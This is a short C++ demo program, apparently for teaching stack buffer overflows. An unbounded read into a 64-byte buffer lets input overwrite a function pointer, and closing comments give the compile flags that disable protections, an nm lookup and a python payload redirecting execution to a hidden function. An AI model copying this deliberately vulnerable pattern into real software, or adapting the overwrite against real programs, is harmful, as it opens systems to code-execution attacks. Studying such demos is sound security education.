//g++ -fno-stack-protector -no-pie -o sb_overflow_cpp sb_overflow.cpp

#include <iostream>
#include <cstring>

void normal() {
    std::cout << "Normal function called.\n";
}

void secret() {
    std::cout << "Secret function called!\n";
}

int main() {
    char buffer[64];
    void (*func_ptr)() = normal; // function pointer we will overwrite

    std::cout << "Enter some text: ";
    std::cin >> buffer; // unsafe, no bounds check

    std::cout << "You typed: " << buffer << std::endl;

    // Call the function pointer (we may have overwritten it!)
    func_ptr();

    return 0;
}
// nm sb_overflow_cpp | grep secret
// python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x4011d4))' | ./sb_overflow_cpp


